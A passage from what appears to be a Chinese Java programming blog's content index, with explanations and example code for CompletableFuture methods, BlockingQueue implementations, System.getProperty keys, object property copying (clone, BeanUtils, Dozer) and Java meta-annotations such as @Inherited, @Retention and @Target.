CompletableFuture，当其中的任何一个完成时，返回这个任务的 CompletableFuture\n\n```java\npublic static void main(String[] args) throws ExecutionException, InterruptedException {\n    Random random = new Random();\n    CompletableFuture<String> future1 = CompletableFuture.supplyAsync(() -> {\n        try {\n            TimeUnit.SECONDS.sleep(random.nextInt(5));\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        return \"hello\";\n    });\n    \n    CompletableFuture<String> future2 = CompletableFuture.supplyAsync(() -> {\n        try {\n            TimeUnit.SECONDS.sleep(random.nextInt(1));\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        return \"world\";\n    });\n    CompletableFuture<Object> result = CompletableFuture.anyOf(future1, future2);\n    System.out.println(result.get());\n}\n```\n\n#### allOf\n\nallOf方法用来实现监听 多个 CompletableFuture 的全部完成。\n\n示例\n\n```java\npublic static void main(String[] args) {\n    CompletableFuture<String> future1 = CompletableFuture.supplyAsync(() -> {\n        try {\n            TimeUnit.SECONDS.sleep(2);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        System.out.println(\"future1完成！\");\n        return \"future1完成！\";\n    });\n    \n    CompletableFuture<String> future2 = CompletableFuture.supplyAsync(() -> {\n        System.out.println(\"future2完成！\");\n        return \"future2完成！\";\n    });\n    \n    CompletableFuture<Void> combindFuture = CompletableFuture.allOf(future1, future2);\n    try {\n        combindFuture.get();\n    } catch (InterruptedException e) {\n        e.printStackTrace();\n    } catch (ExecutionException e) {\n        e.printStackTrace();\n    }\n    System.out.println(\"future1: \" + future1.isDone() + \"，future2: \" + future2.isDone());\n}\n```\n\n### CompletableFuture：其他\n\n#### getNow：提交任务继续运行\n\n```java\npublic T getNow(T valueIfAbsent)\n```\n\n 示例：\n\n```java\npublic class CompletableFutureExample4 {\n    public static void main(String[] args) throws InterruptedException {\n        String result = CompletableFuture.supplyAsync(() -> {\n            sleep(3);\n            System.out.println(System.currentTimeMillis() + \" 任务继续执行\");\n            return System.currentTimeMillis() + \" HELLO\";\n        }).getNow(System.currentTimeMillis() + \" WORLD\");\n        System.out.println(result);\n        sleep(5);\n        System.out.println(System.currentTimeMillis() + \" main exit.\");\n    }\n\n    private static void sleep(int seconds) {\n        try {\n            TimeUnit.SECONDS.sleep(seconds);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n\n# Console输出\n1659410799621 WORLD\n1659410802622 任务继续执行\n1659411545079 main exit.\n```\n\n#### complete：提交任务不会继续运行\n\n如果尚未完成，则将 get() 和相关方法返回的值设置为给定值\n\n```java\npublic boolean complete(T value)\n```\n\n示例：\n\n```java\npublic class CompletableFutureExample5 {\n    public static void main(String[] args) throws ExecutionException, InterruptedException {\n        CompletableFuture<String> result = CompletableFuture.supplyAsync(() -> {\n            sleep(3);\n            System.out.println(System.currentTimeMillis() + \" 任务继续执行\");\n            return System.currentTimeMillis() + \" HELLO\";\n        });\n        boolean status = result.complete(System.currentTimeMillis() + \" WORLD\");\n        System.out.println(System.currentTimeMillis() + \" \" + status);\n        System.out.println(result.get());\n        sleep(5);\n        System.out.println(System.currentTimeMillis() + \" main exit.\");\n    }\n\n    private static void sleep(int seconds) {\n        try {\n            TimeUnit.SECONDS.sleep(seconds);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n# Console输出\n1659410986243 true\n1659410986243 WORLD\n1659410991249 main exit. \n```\n\n#### completeExceptionally\n\n如果任务尚未完成，则导致调用 get() 和相关方法抛出给定的异常\n\n```java\npublic boolean completeExceptionally(Throwable ex)\n```\n\n示例\n\n```java\npublic class CompletableFutureExample6 {\n    public static void main(String[] args) throws ExecutionException, InterruptedException {\n        CompletableFuture<String> result = CompletableFuture.supplyAsync(() -> {\n            sleep(3);\n            System.out.println(System.currentTimeMillis() + \" 任务继续执行\");\n            return System.currentTimeMillis() + \" HELLO\";\n        });\n        boolean status = result.completeExceptionally(new RuntimeException(\"等不及返回结果\"));\n        System.out.println(System.currentTimeMillis() + \" \" + status);\n        // 抛出异常\n        System.out.println(result.get());\n        // 不会执行\n        //result.thenAccept((e) -> {\n        //    System.out.println(\"-------------\");\n        //});\n        // 不会执行\n        //result.thenApply(e -> \"-----\");\n        sleep(5);\n        System.out.println(System.currentTimeMillis() + \" main exit.\");\n    }\n\n    private static void sleep(int seconds) {\n        try {\n            TimeUnit.SECONDS.sleep(seconds);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}\n```\n\n```java\n1659412396003 true\nException in thread \"main\" java.util.concurrent.ExecutionException: java.lang.RuntimeException: 等不及返回结果\n\tat java.util.concurrent.CompletableFuture.reportGet(CompletableFuture.java:357)\n\tat java.util.concurrent.CompletableFuture.get(CompletableFuture.java:1895)\n\tat hots.utils.executor.future.CompletableFutureExample6.main(CompletableFutureExample6.java:22)\nCaused by: java.lang.RuntimeException: 等不及返回结果\n\tat hots.utils.executor.future.CompletableFutureExample6.main(CompletableFutureExample6.java:19)\n \n```\n\n# 并发集合\n\nJDK中并发队列提供了两种实现,一种是高性能队列ConcurrentLinkedQueue,一种是阻塞队列BlockingQueue,两种都继承自Queue:\n\n## BlockingQueue集合类关系图\n\n![BlockingDeque](https://hmxyl-image.oss-cn-hangzhou.aliyuncs.com/note/BlockingDeque-1667231117133-94.png) \n\n## BlockingQueue的7个子类\n\n- Queue 方法概述\n\n|         | Throws exception | Returns special value                                        |      |\n| ------- | ---------------- | ------------------------------------------------------------ | ---- |\n| Insert  | add(e)           | offer(e)：【@return：true if the element was added to this queue, else false】 |      |\n| Remove  | remove()         | poll()：【@return：the head of this queue, or null if the specified waiting time elapses before an element is available】 |      |\n| Examine | element()        | peek()：【@return：the head of this queue, or null if this queue is empty】 |      |\n\n\n\n-  BlockingQueue 方法概述\n\n|         | Throws exception | Returns special value | Blocks | Times out            |\n| ------- | ---------------- | --------------------- | ------ | -------------------- |\n| Insert  | add(e)           | offer(e)              | put(e) | offer(e, time, unit) |\n| Remove  | remove()         | poll()                | take() | poll(time, unit)     |\n| Examine | element()        | peek()                | ---    | ---                  |\n\n-  说明\n\n1. ArrayBlockingQueue\n\n   ​\t\t **基于数组的阻塞队列实现**，在ArrayBlockingQueue内部，维护了一个定长数组，以便缓存队列中的数据对象，这是一个常用的阻塞队列，除了一个定长数组外，ArrayBlockingQueue内部还保存着两个整形变量，分别标识着队列的头部和尾部在数组中的位置。**ArrayBlockingQueue在生产者放入数据和消费者获取数据，都是共用同一个锁对象**，**由此也意味着两者无法真正并行运行，这点尤其不同于LinkedBlockingQueue；** 按照实现原理来分析，ArrayBlockingQueue完全可以采用分离锁，从而实现生产者和消费者操作的完全并行运行。Doug Lea之所以没这样去做，也许是因为ArrayBlockingQueue的数据写入和获取操作已经足够轻巧，以至于引入独立的锁机制，除了给代码带来额外的复杂性外，其在性能上完全占不到任何便宜。  **ArrayBlockingQueue和LinkedBlockingQueue间还有一个明显的不同之处在于，前者在插入或删除元素时不会产生或销毁任何额外的对象实例，而后者则会生成一个额外的Node对象。这在长时间内需要高效并发地处理大批量数据的系统中，其对于GC的影响还是存在一定的区别。而在创建ArrayBlockingQueue时，我们还可以控制对象的内部锁是否采用公平锁，默认采用非公平锁。** \n\n2. LinkedBlockingQueue\n\n   - **基于链表的阻塞队列**，同ArrayBlockingQueue类似，其内部也维持着一个数据缓冲队列（该队列由一个链表构成）。当生产者往队列中放入一个数据时，队列会从生产者手中获取数据，并缓存在队列内部，而生产者立即返回；只有当队列缓冲区达到最大值缓存容量时（LinkedBlockingQueue可以通过构造函数指定该值），才会阻塞生产者队列，直到消费者从队列中消费掉一份数据，生产者线程会被唤醒，反之对于消费者这端的处理也基于同样的原理。而LinkedBlockingQueue之所以能够高效的处理并发数据，**还因为其对于生产者端和消费者端分别采用了独立的锁来控制数据同步，这也意味着在高并发的情况下生产者和消费者可以并行地操作队列中的数据，以此来提高整个队列的并发性能。**\n   - **作为开发者，我们需要注意的是，如果构造一个LinkedBlockingQueue对象，而没有指定其容量大小，LinkedBlockingQueue会默认一个类似无限大小的容量（Integer.MAX_VALUE），这样的话，如果生产者的速度一旦大于消费者的速度，也许还没有等到队列满阻塞产生，系统内存就有可能已被消耗殆尽了**\n   - ArrayBlockingQueue和LinkedBlockingQueue是两个最普通也是最常用的阻塞队列，一般情况下，在处理多线程间的生产者消费者问题，使用这两个类足以\n\n3. PriorityBlockingQueue\n\n   ​\t\t基于优先级的阻塞队列（优先级的判断通过构造函数传入的Compator对象来决定），但需要注意的是PriorityBlockingQueue并不会阻塞数据生产者，而只会在没有可消费的数据时，阻塞数据的消费者。因此使用的时候要特别注意，生产者生产数据的速度绝对不能快于消费者消费数据的速度，否则时间一长，会最终耗尽所有的可用堆内存空间。在实现PriorityBlockingQueue时，**内部控制线程同步的锁采用的是公平锁**\n\n4. DelayQueue\n\n   ​\t\tDelayQueue中的元素只有当其指定的延迟时间到了，才能够从队列中获取到该元素。DelayQueue是一个没有大小限制的队列，因此往队列中插入数据的操作（生产者）永远不会被阻塞，而只有获取数据的操作（消费者）才会被阻塞。\n\n   ​\t\tDelayQueue使用场景较少，但都相当巧妙，常见的例子比如使用一个DelayQueue来管理一个超时未响应的连接队列。\n\n5. SynchronousQueue\n\n   ​\t\t一种无缓冲的等待队列，生产者产生的数据直接会被消费者获取并消费， 类似于无中介的直接交易，有点像原始社会中的生产者和消费者，生产者拿着产品去集市销售给产品的最终消费者，而消费者必须亲自去集市找到所要商品的直接生产者，如果一方没有找到合适的目标，那么对不起，大家都在集市等待。相对于有缓冲的BlockingQueue来说，少了一个中间经销商的环节（缓冲区），如果有经销商，生产者直接把产品批发给经销商，而无需在意经销商最终会将这些产品卖给那些消费者，由于经销商可以库存一部分商品，因此相对于直接交易模式，总体来说采用中间经销商的模式会吞吐量高一些（可以批量买卖）；但另一方面，又因为经销商的引入，使得产品从生产者到消费者中间增加了额外的交易环节，单个产品的及时响应性能可能会降低。\n   　　\n\n   ​\t\t声明一个SynchronousQueue有两种不同的方式，它们之间有着不太一样的行为。\n\n   公平模式和非公平模式的区别:\n   　　\n\n   - 如果采用公平模式：SynchronousQueue会采用公平锁，并**配合一个FIFO队列**来阻塞多余的生产者和消费者，从而体系整体的公平策略；\n\n   - 但如果是非公平模式（SynchronousQueue默认）：SynchronousQueue采用非公平锁，同时**配合一个LIFO队列**来管理多余的生产者和消费者，而后一种模式，如果生产者和消费者的处理速度有差距，则很容易出现饥渴的情况，即可能有某些生产者或者是消费者的数据永远都得不到处理。\n\n6. LinkedTransferQueue\n\n   传入的数据，需要担保被使用了。否则放入失败/阻塞\n\n   ```\n   private static final int NOW   = 0; // for untimed poll, tryTransfer\n   private static final int ASYNC = 1; // for offer, put, add\n   private static final int SYNC  = 2; // for transfer, take\n   private static final int TIMED = 3; // for timed poll, tryTransfer\n   ```\n\n\n\n|                                            | ArrayBlockingQueue                                           | PriorityBlockingQueue                                        | LinkedBlockingQueue                                          | LinkedBlockingDeque                                          | SynchronousQueue                                             | DelayQueue                                                   | LinkedTransferQueue                                          |\n| ------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ | ------------------------------------------------------------ |\n| **bounded（边界）**                        | Y                                                            | N                                                            | Optional                                                     | Optional                                                     | Y                                                            | N                                                            | N                                                            |\n| **add**                                    | 添加成功：返回`true`；<br />添加失败（已满）：抛出`IllegalStateException`<br /> | 调用`offer`，返回结果同offer                                 | 调用`offer`<br />添加成功：返回`true`；<br />添加失败（false）：抛出`IllegalStateException`<br /> | <font color=\"orange\">**由`addLast`执行**</font><br /><br />调用`offerLast`<br />添加成功：返回`true`；<br />添加失败（false）：抛出`IllegalStateException`<br /> | 调用`offer`<br />添加成功：返回`true`；<br />添加失败（已满）：抛出`IllegalStateException`<br /> | 同`offer`                                                    | 在尾部插入元素<br />无边界Queue，不会抛出IllegalStateException，或者false。<br />添加成功：返回`true`；<br /> |\n| <font color=\"red\">**offer**</font>         | 添加成功：返回`true`；<br />添加失败(已满)：返回`false`<br /> | 添加成功，返回`true`；<br />无边界，不存在已满<br />抛出异常：元素无法compare<br /> | 队尾添加成功：返回`true`；<br />添加失败(已满)：返回`false`<br /> | <font color=\"orange\">**同`offerLast`**</font><br /><br />队尾添加成功：返回`true`；<br />添加失败(已满)：返回`false`<br /> | 如果另一个线程正在等待接收，则将指定元素插入此队列，返回`true`;<br/>没有接收线程，返回`false` | 在尾部插入元素<br />添加成功，返回`true`；<br />无边界Queue，不存在已满<br /> | 同 `add`                                                     |\n| <font color=\"blue\">**put（阻塞）**</font>  | 将指定元素插入此队列的==尾部==，如果队列已满，则==等待空间可用== | 同`offer`。无边界，无需阻塞。                                | 在此队列的尾部插入指定元素，如有必要，则==等待空间可用==。   | <font color=\"orange\">**同`putLast`**</font><br /><br />在此队列的尾部插入指定元素，如有必要，则==等待空间可用==。 | 将指定元素添加到此队列中，阻塞，等待另一个线程接收它。       | 同`offer`                                                    | 同`add`                                                      |\n| **remove**                                 | `poll`头部元素，如果为null，则会抛出异常                     | `poll`头部元素，如果为null，则会抛出异常                     | `poll`头部元素，如果为null，则会抛出异常                     | <font color=\"orange\"> **同`removeFirst`** </font> <br /><br />`pollFirst`头部元素，如果为null，则会抛出异常 | `poll`头部元素，如果为null，则会抛出异常                     | `poll`头部元素，如果为null，则会抛出异常                     | `poll`头部元素，如果为null，则会抛出异常                     |\n| <font color=\"red\">**poll**</font>          | 移除头部元素并返回<br />无元素返回`null`                     | 移除头部元素并返回<br />无元素返回`null`                     | 移除头部元素并返回<br />无元素返回`null`                     | <font color=\"orange\"> **同`pollFirst`** </font> <br /><br />移除头部元素并返回<br />无元素返回`null` | 移除头部元素并返回<br />如果没有可用元素，则返回 `null`<br />无元素返回`null` | 移除头部元素并返回<br />如果此队列没有具有过期延迟的元素，则返回`null`<br />无元素返回`null` | 移除头部元素并返回<br />无元素返回`null`                     |\n| **element**                                | `peek `头部元素<br />若结果为null，则抛出异常`NoSuchElementException` | `peek `头部元素<br />若结果为null，则抛出异常`NoSuchElementException` | `peek `头部元素<br />若结果为null，则抛出异常`NoSuchElementException` | **`peekFirst`**头部元素<br /><br />若结果为null，则抛出异常`NoSuchElementException` | `peek `头部元素<br />永远抛出`NoSuchElementException`        | `peek `头部元素<br />若结果为null，则抛出异常`NoSuchElementException` | `peek `头部元素<br />若结果为null，则抛出异常`NoSuchElementException` |\n| **peek**                                   | 获取头部元素<br />不会删除元素                               | 获取头部元素<br />不会删除元素                               | 获取头部元素<br />不会删除元素                               | **`peekFirst`**头部元素<br /><br />获取头部元素<br />不会删除元素 | 直接 `return null`                                           | 获取头部元素<br />不会删除元素                               | 获取头部元素<br />不会删除元素                               |\n| <font color=\"blue\">**take（阻塞）**</font> | 移除头部元素并返回<br />队列无元素，则阻塞等待<br />         | 移除头部元素并返回<br />队列无元素，则阻塞等待<br />         | 移除头部元素并返回<br />队列无元素，则阻塞等待<br />         | 同**`takeFirst`**<br /><br />移除头部元素并返回<br />队列无元素，则阻塞等待<br /> | 一直等待，直到有另一个线程`transfer`元素                     | 一直等待，直到有线程放进元素，且头部元素过期                 | 一直等待，直到有线程放进元素                                 |\n| **transfer**                               | 无                                                           | 无                                                           | 无                                                           | 无                                                           | 无                                                           | 无                                                           | 在队列尾部插入元素，若没有被消费，则一直等待                 |\n\n\n\n- ConcurrentHashMap\n\n- ConcurrentSkipListMap\n\n- ConcurrentSkipListSet\n\n- ConcurrentLinkedQueue\n\n- ConcurrentLinkedDeque\n\n- CopyOnWriteArrayList\n\n- CopyOnWriteArraySet\n","tags":["Java"],"categories":["后端","Java"]},{"title":"系统方法：System.getProperty","url":"/20250619/80d3479f.html","content":"\n\n\n| code                              | 说明                            |\n| --------------------------------- | ------------------------------- |\n| java.versionJava                  | 运行时环境版本                  |\n| java.vendorJava                   | 运行时环境供应商                |\n| java.vendor.urlJava               | 供应商的URL                     |\n| java.homeJava                     | 安装目录                        |\n| java.vm.specification.versionJava | 虚拟机规范版本                  |\n| java.vm.specification.vendorJava  | 虚拟机规范供应商                |\n| java.vm.specification.nameJava    | 虚拟机规范名称                  |\n| java.vm.versionJava               | 虚拟机实现版本                  |\n| java.vm.vendorJava                | 虚拟机实现供应商                |\n| java.vm.nameJava                  | 虚拟机实现名称                  |\n| java.specification.versionJava    | 运行时环境规范版本              |\n| java.specification.vendorJava     | 运行时环境规范供应商            |\n| java.specification.nameJava       | 运行时环境规范名称              |\n| java.class.versionJava            | 类格式版本号                    |\n| java.class.pathJava               | 类路径                          |\n| java.library.path                 | 加载库时搜索的路径列表          |\n| java.io.tmpdir                    | 默认的临时文件路径              |\n| java.compiler                     | 要使用的JIT编译器的名称         |\n| java.ext.dirs                     | 一个或多个扩展目录的路径        |\n| os.name                           | 操作系统的名称                  |\n| os.arch                           | 操作系统的架构                  |\n| os.version                        | 操作系统的版本                  |\n| file.separator                    | 文件分隔符（在UNIX系统中是“/”） |\n| path.separator                    | 路径分隔符（在UNIX系统中是“:”） |\n| line.separator                    | 行分隔符（在UNIX系统中是“/n”）  |\n| user.name                         | 用户的账户名称                  |\n| user.home                         | 用户的主目录                    |\n| user.dir                          | 用户的当前工作目录              |\n","tags":["Java"],"categories":["后端","Java"]},{"title":"对象之间相同属性的赋值","url":"/20250619/79cf73a2.html","content":"\n\n\n参考：[Java 对象之间相同属性的赋值](https://blog.csdn.net/power0405hf/article/details/78521286)\n\n# Java中clone()与new的区别\n\n区别\n\n（1）在java中clone()与new都能创建对象。\n（2）clone()不会调用构造方法；new会调用构造方法。\n（3）clone()能快速创建一个已有对象的副本，即创建对象并且将已有对象中所有属性值克隆；\n\nnew只能在JVM中申请一个空的内存区域，对象的属性值要通过构造方法赋值。\n\n注意：\n（1）使用clone()类必须实现**java.lang.Cloneable**接口并**重写Object类的clone()方法**，如果没有实现Cloneable()接口将会抛出CloneNotSupportedException异常。（此类实现java.lang.Cloneable接口，指示Object.clone()方法可以合法的对该类实例进行按字段复制。）\n（2）默认的Object.clone()方法是浅拷贝，创建好对象的副本然后通过“赋值”拷贝内容，如果类包含引用类型变量，那么原始对象和克隆对象的引用将指向相同的引用内容。\n\n面试题：什么是浅拷贝？什么是深拷贝？\n\n- “浅拷贝”：默认的Object.clone()方法,对于引用类型成员变量拷贝只是拷贝“值”即地址，没有在堆中开辟新的内存空间。\n- “深拷贝”：重写clone()方法，对于引用类型成员变量，重新在堆中开辟新的内存空间。\n\n# BeanUtils.copyProperties：可以进行类型转换\n\n```java\nimport org.springframework.beans.BeanUtils;\nUser src = new User(); \nUser dest = new User(); \nBeanUtils.copyProperties(dest, src);\n```\n\n# PropertyUtils.copyProperties：不会进行类型转换\n\n# 使用Dozer\n\n在pom.xml中增加依赖\n\n```xml\n<dependency>\n  <groupId>net.sf.dozer</groupId>\n  <artifactId>dozer</artifactId>\n  <version>5.5.1</version>\n</dependency>\n```\n\nSpring集成dozer\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE beans PUBLIC \"-//SPRING//DTD BEAN//EN\" \"http://www.springframework.org/dtd/spring-beans.dtd\">\n<beans>\n    <bean id=\"baseMapper\" class=\"org.dozer.spring.DozerBeanMapperFactoryBean\">\n        <property name=\"mappingFiles\">\n            <list>\n                <value>classpath:mapping/dozer-mapping.xml</value>\n            </list>\n        </property>\n    </bean>\n</beans>\n```\n\n使用baseMapper进行Bean的转换\n\n```java\n@Autowired \nprivate Mapper baseMapper; \nprivate UserVO doToVo(UserDO userDO){     \n  if(userDO == null) return null;     \n  UserVO vo = baseMapper.map(userDO, UserVO.getClass());     \n  if(userDO.getCompanyId != null) getCompany(vo);     \n  return vo; \n}\n```\n\n通过以上的代码加配置，我们就实现了从DO转换到VO的部分操作，之所以说是部分操作，是因为我们在dozer-mapping.xml并没有做多余的配置，只是使用dozer将DO中和VO中共有的属性转换了过来。对于其他的类型不同或者名称不同等的转换可以参考官网例子通过设置dozer-mapping.xml文件来实现。\n \t\n\n上面还有一个getCompany()没有实现。这个方法其实就是通过companyId查询出company实体，然后在赋值给UserVO中的company属性。\n","tags":["Java"],"categories":["后端","Java"]},{"title":"Java注解","url":"/20250619/7039576b.html","content":"\n\n\n# 标准注解\n\nJava的三种标准注解分别是@Override、@Deprecated和@Suppress Warnings。Java SE55内置了三种，定义在 java.lang中的注解：\n\n> @Override： 用在方法上，当我们想重写一个方法时，在方法上加 @Override，当我们方法的名字出错时，编译器就会报错。\n>\n> @SuppressWarnings ：用来压制程序中出来的警告，比如在没有用泛型或是方法已经过时的时候。\n>\n> @Deprecated ：用来表示某个类或属性或方法已经过时，不想别人再用时，在属性和方法上用 @Deprecated 修饰。如果程序员使用了注解为它的元素，那么编译器会发出警告信息。\n\n# 元注解\n\n> **元注解，就是用来中声明注解类型时需要使用到的注解。**Java提供了四种元注解，它们分别是**@Target、@Retention、@Documented和@Inherited。**\n\n##  @Inherited\n\n### 注解源码\n\n```java\n@Documented\n@Retention(RetentionPolicy.RUNTIME)\n@Target(ElementType.ANNOTATION_TYPE)\npublic @interface Inherited {\n}\n```\n\n### 使用测试\n\n来源：https://blog.csdn.net/snow_crazy/article/details/39381695\n\n> Inherited作用是，使用此注解声明出来的自定义注解，在使用此自定义注解时，如果注解在类上面时，子类会自动继承此注解，否则的话，子类不会继承此注解。\n>\n> 这里一定要记住，使用Inherited声明出来的注解，只有在类上使用时才会有效，对方法，属性等其他无效\n\n- 注解定义\n\n    ```java\n    import java.lang.annotation.Retention;\n    import java.lang.annotation.RetentionPolicy;\n    /**\n     * 声明的此注解使用了Inherited元注解，表示此注解用在类上时，会被子类所继承\n     */\n    @Retention(RetentionPolicy.RUNTIME)\n    @Inherited\n    public @interface InheritedTest {\n    \n        String value();\n    }\n    ```\n\n    ```java\n    import java.lang.annotation.Retention;\n    import java.lang.annotation.RetentionPolicy;\n    \n    @Retention(RetentionPolicy.RUNTIME)\n    public @interface InheritedTest2 {\n    \n        String value();\n    }\n    ```\n\n    \n\n- 注解使用\n\n    ```java\n    /**\n     * 父类\n     */\n    @InheritedTest(\"使用Inherited的注解 class\")\n    @InheritedTest2(\"未使用Inherited的注解 class\")\n    public class Parent {\n    \n        @InheritedTest(\"使用Inherited的注解 method\")\n        @InheritedTest2(\"未使用Inherited的注解 method\")\n        public void method() {\n    \n        }\n    \n        @InheritedTest(\"使用Inherited的注解 method2\")\n        @InheritedTest2(\"未使用Inherited的注解 method2\")\n        public void method2() {\n    \n        }\n    \n        @InheritedTest(\"使用Inherited的注解 method2\")\n        public void method3() {\n    \n        }\n    \n        @InheritedTest2(\"未使用Inherited的注解 method2\")\n        public void method4() {\n    \n        }\n    \n        @InheritedTest(\"使用Inherited的注解 field\")\n        @InheritedTest2(\"未使用Inherited的注解 field\")\n        public String a;\n    \n    \n        @InheritedTest(\"使用Inherited的注解 field\")\n        @InheritedTest2(\"未使用Inherited的注解 field\")\n        public String b;\n    }\n    ```\n\n    ```java\n    public class Child extends Parent {\n    \n        @Override\n        public void method() {\n        }\n    \n        @Override\n        public void method3() {\n        }\n    \n        public String a;\n    \n    }\n    ```\n\n- 注解测试\n\n    ```java\n    import java.lang.reflect.Field;\n    import java.lang.reflect.Method;\n    \n    public class Test {\n        public static void main(String[] args) throws NoSuchMethodException, SecurityException, NoSuchFieldException {\n            Class<Child> clazz = Child.class;\n            //对类进行测试\n            System.out.println(\"对类进行测试\");\n            if (clazz.isAnnotationPresent(InheritedTest.class)) {\n                System.out.println(clazz.getAnnotation(InheritedTest.class).value());\n            }\n            if (clazz.isAnnotationPresent(InheritedTest2.class)) {\n                System.out.println(clazz.getAnnotation(InheritedTest2.class).value());\n            }\n    \n            System.out.println();\n    \n            //对方法1 进行测试（子类覆写父类）\n            testMethod(clazz.getMethod(\"method\", null), \"（子类覆写父类）\");\n            //对方法2 进行测试\n            testMethod(clazz.getMethod(\"method2\", null), \"（子类未覆写父类）\");\n            //对方法3 进行测试\n            testMethod(clazz.getMethod(\"method3\", null), \"（子类覆写父类）\");\n            //对方法4 进行测试\n            testMethod(clazz.getMethod(\"method4\", null), \"（子类未覆写父类）\");\n    \n            //对属性测试\n            testField(clazz.getField(\"a\"), \"（子类覆写父类）\");\n            testField(clazz.getField(\"b\"), \"（子类未覆写父类）\");\n        }\n    \n        private static void testMethod(Method method, String desc) {\n    \n            System.out.println(\"对方法：\" + method.getName() + \"，进行测试。\" + desc);\n    \n            if (method.isAnnotationPresent(InheritedTest.class)) {\n                System.out.println(method.getAnnotation(InheritedTest.class).value());\n            }\n            if (method.isAnnotationPresent(InheritedTest2.class)) {\n                System.out.println(method.getAnnotation(InheritedTest2.class).value());\n            }\n    \n            System.out.println();\n        }\n    \n        private static void testField(Field field, String desc) {\n    \n            System.out.println(\"对属性：\" + field.getName() + \"，进行测试\");\n    \n            if (field.isAnnotationPresent(InheritedTest.class)) {\n                System.out.println(field.getAnnotation(InheritedTest.class).value());\n            }\n            if (field.isAnnotationPresent(InheritedTest2.class)) {\n                System.out.println(field.getAnnotation(InheritedTest2.class).value());\n            }\n            System.out.println();\n        }\n    \n    }\n    ```\n\n    测试结果：\n\n    ```\n    \n    对类进行测试\n    使用Inherited的注解 class\n    \n    对方法：method，进行测试。（子类覆写父类）\n    \n    对方法：method2，进行测试。（子类未覆写父类）\n    使用Inherited的注解 method2\n    未使用Inherited的注解 method2\n    \n    对方法：method3，进行测试。（子类覆写父类）\n    \n    对方法：method4，进行测试。（子类未覆写父类）\n    未使用Inherited的注解 method2\n    \n    对属性：a，进行测试\n    \n    对属性：b，进行测试\n    使用Inherited的注解 field\n    未使用Inherited的注解 field\n    ```\n\n\n\n\n\n\n## @Retention\n\n> **@Retention**用来定义该注解在哪一个级别可用，在**源代码中(SOURCE)**、**类文件中(CLASS)**或者**运行时(RUNTIME)**。\n\n### 注解源码\n\n```\n@Documented\n@Retention(RetentionPolicy.RUNTIME)\n@Target(ElementType.ANNOTATION_TYPE)\npublic @interface Retention {\n    /**\n     * Returns the retention policy.\n     * @return the retention policy\n     */\n    RetentionPolicy value();\n}\n```\n\n```java\npackage java.lang.annotation;\n\n/**\n * Annotation retention policy.  The constants of this enumerated type\n * describe the various policies for retaining annotations.  They are used\n * in conjunction with the {@link Retention} meta-annotation type to specify\n * how long annotations are to be retained.\n *\n * @author  Joshua Bloch\n * @since 1.5\n */\npublic enum RetentionPolicy {\n    /**\n     * Annotations are to be discarded by the compiler.\n     */\n    SOURCE,\n\n    /**\n     * Annotations are to be recorded in the class file by the compiler\n     * but need not be retained by the VM at run time.  This is the default\n     * behavior.\n     */\n    CLASS,\n\n    /**\n     * Annotations are to be recorded in the class file by the compiler and\n     * retained by the VM at run time, so they may be read reflectively.\n     *\n     * @see java.lang.reflect.AnnotatedElement\n     */\n    RUNTIME\n}\n```\n\n### 注解的作用\n\nRetentionPolicy 决定了 Retention 注解应该如何去保留，也可理解为 @Retention 搭配枚举类型 RetentionPolicy 使用。\n\n按生命周期来划分可分为3类：（这3个生命周期分别对应于：Java源文件(.java文件) ---> .class文件 ---> 内存中的字节码）\n\n- `RetentionPolicy.SOURCE`：`（.java文件）`注解只保留在源文件，当Java文件编译成 .class 文件的时候，被其标注的注解被遗弃；\n\n- `RetentionPolicy.CLASS`：`（.class文件）`注解被保留到class文件中，但jvm加载 .class 文件时候，被其标注的注解会被遗弃，这是默认的生命周期；\n\n- `RetentionPolicy.RUNTIME`：`（内存中的字节码）` 注解不仅被保留到 .class 文件中，jvm 加载 .class 文件之后，被其标注的注解仍然存在，所以这个时候才可能通过反射机制读取注解的信息，而前两个生命周期中，通过反射机制读取不到注解信息的；\n\n\n\n### 注解生命周期的选择\n\n首先要明确生命周期长度 RUNTIME > CLASS > SOURCE，所以后者能作用到的地方前者一定也能作用到，但是反过来，前者能作用到的地方后者就作用不到。\n\n- 一般如果需要在`运行时去动态获取注解信息`，那只能用生命周期最长的 `RUNTIME` 标注了\n\n    比如以下源码中我们常用到的注解：**@Transient、@Deprecated、@Documented、@Inherited、@Retention、@Target** ... 等等很多。\n\n- 如果要在编译时进行一些预处理操作，就用 CLASS注解；(如下)\n\n    ```java\n    package lombok;\n    \n    import java.lang.annotation.Documented;\n    import java.lang.annotation.ElementType;\n    import java.lang.annotation.Retention;\n    import java.lang.annotation.RetentionPolicy;\n    import java.lang.annotation.Target;\n    \n    /**\n     * If put on a parameter, lombok will insert a null-check at the start of the method / constructor's body, throwing a\n     * {@code NullPointerException} with the parameter's name as message. If put on a field, any generated method assigning\n     * a value to this field will also produce these null-checks. \n     */\n    @Target({ElementType.FIELD, ElementType.METHOD, ElementType.PARAMETER, ElementType.LOCAL_VARIABLE, ElementType.TYPE_USE})\n    @Retention(RetentionPolicy.CLASS)\n    @Documented\n    public @interface NonNull {\n    }\n    \n    ```\n\n- 如果只是做一些检查性的操作，比如源码中的 **@Override、@SuppressWarnings、@Native、@Generated** 等就是被 **RetentionPolicy.SOURCE** 标注的\n\n\n## @Target\n\n> **@Target**用来定义你的注解将应用于什么地方(例如是一个方法或者一个域)。\n\n### 注解源码\n\n```java\n@Documented\n@Retention(RetentionPolicy.RUNTIME)\n@Target(ElementType.ANNOTATION_TYPE)\npublic @interface Target {\n    /**\n     * Returns an array of the kinds of elements an annotation type\n     * can be applied to.\n     * @return an array of the kinds of elements an annotation type\n     * can be applied to\n     */\n    ElementType[] value();\n}\n```\n\n```java\n/**\n * The constants of this enumerated type provide a simple classification of the\n * syntactic locations where annotations may appear in a Java program. These\n * constants are used in {@link Target java.lang.annotation.Target}\n * meta-annotations to specify where it is legal to write annotations of a\n * given type.\n *\n * <p>The syntactic locations where annotations may appear are split into\n * <em>declaration contexts</em> , where annotations apply to declarations, and\n * <em>type contexts</em> , 